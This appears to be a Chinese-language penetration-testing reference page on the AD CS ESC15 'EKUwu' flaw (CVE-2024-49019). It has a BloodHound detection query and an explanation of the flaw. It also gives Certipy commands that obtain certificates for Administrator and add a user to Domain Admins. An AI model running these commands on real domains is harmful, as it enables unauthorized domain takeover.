# Active Directory - 证书 ESC15

## ESC15 - EKUwu 应用程序策略 - CVE-2024-49019

该技术现已分配 CVE 编号，并已于 11 月 12 日修补。详情参见 [Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019)。

**前提条件**：

* **模板 Schema** 版本 1
* **ENROLLEE_SUPPLIES_SUBJECT** = `True`

**利用方法**：

使用以下 Cypher 查询从 BloodHound 数据中检测该漏洞。

```ps1
MATCH p=(:Base)-[:MemberOf*0..]->()\-[:Enroll|AllExtendedRights]->(ct:CertTemplate)-[:PublishedTo]->(:EnterpriseCA)-[:TrustedForNTAuth]->(:NTAuthStore)-[:NTAuthStoreFor]->(:Domain) WHERE ct.enrolleesuppliessubject = True AND ct.authenticationenabled = False AND ct.requiresmanagerapproval = False AND ct.schemaversion = 1 RETURN p
```

**应用程序策略**（Application Policies）扩展是一种专有的证书扩展，OID 为 `1.3.6.1.4.1.311`，与 **x509 EKU** 相同。它允许用户通过使用与增强密钥用途扩展相同的 OID 来为证书指定额外的使用场景。
如果应用程序策略与 EKU 之间存在冲突，Microsoft 会优先使用专有的应用程序策略。

> "应用程序策略是 Microsoft 特有的，处理方式与扩展密钥用途类似。如果证书同时具有包含应用程序策略的扩展和 EKU 扩展，则 EKU 扩展将被忽略。" - Microsoft

当用户基于 schema version 1 模板请求证书并包含应用程序策略时，该策略会被纳入证书中。这使得用户可以指定任意 EKU，从而绕过 ESC2 的要求。

**ESC1** - WebServer 模板在 ADCS 中默认启用，要求用户提供 SAN，且仅具有 `Server Authentication` EKU。使用 [ly4k/Certipy PR #228](https://github.com/ly4k/Certipy/pull/228)，我们可以向 `WebServer` 添加 `Client Authentication` EKU。此模板上任何拥有 `Enroll` 权限的人现在都可以接管域。

```ps1
certipy req -dc-ip 10.10.10.10 -ca CA -target-ip 10.10.10.11 -u user@domain.com -p 'P@ssw0rd' -template WebServer -upn Administrator@domain.com --application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# 在 LDAP Shell 中
add_user pentest_user
add_user_to_group pentest_user "Domain Admins"
```

**ESC2/ESC3** - **Certificate Request Agent**（`1.3.6.1.4.1.311.20.2.1`），

```ps1
certipy -req -u user@domain.com -p 'P@ssw0rd' --application-policies "1.3.6.1.4.1.311.20.2.1" -ca "Lab Root CA" -template WebServer -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy -req -u user@domain.com -p 'P@ssw0rd' -on-behalf-of DOMAIN\\Administrator -Template User -ca "Lab Root CA" -pfx user.pfx -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## 参考资料

* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps - frank - July 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [ADCS Exploitation Part 2: Certificate Mapping + ESC15 - Giulio Pierantoni - October 10, 2024](https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760)
* [Curious case of AD CS ESC15 vulnerable instance and its manual exploitation - Mannu Linux - February 13, 2025](https://www.mannulinux.org/2025/02/Curious-case-of-AD-CS-ESC15-vulnerable-instance-and-its-manual-exploitation.html)
* [EKUwu: Not just another AD CS ESC - Justin Bollinger - October 08, 2024](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
* [ESC15/EKUwu PR #228 - dru1d-foofus - August 10, 2024](https://github.com/ly4k/Certipy/pull/228)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
